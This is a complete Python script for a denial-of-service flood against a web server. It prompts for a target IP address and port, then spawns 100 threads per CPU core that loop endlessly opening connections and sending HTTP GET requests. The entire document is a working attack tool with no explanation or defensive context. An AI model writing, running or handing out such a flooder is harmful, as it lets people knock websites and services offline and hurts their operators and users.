import threading
import socket
import os

target = input("Enter the IP address of the target web server: ")
port = int(input("Enter the port number of the target web server: "))
message = "GET / HTTP/1.1\r\nHost: " + target + "\r\n\r\n"

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(message.encode())
            s.close()
        except:
            s.close()

def create_process(num_threads):
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=attack)
        thread.daemon = True
        threads.append(thread)
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

if __name__ == '__main__':
    num_cores = os.cpu_count()
    processes = []
    for i in range(num_cores):
        process = threading.Thread(target=create_process, args=(100,))
        process.daemon = True
        processes.append(process)
    for process in processes:
        process.start()
    for process in processes:
        process.join()
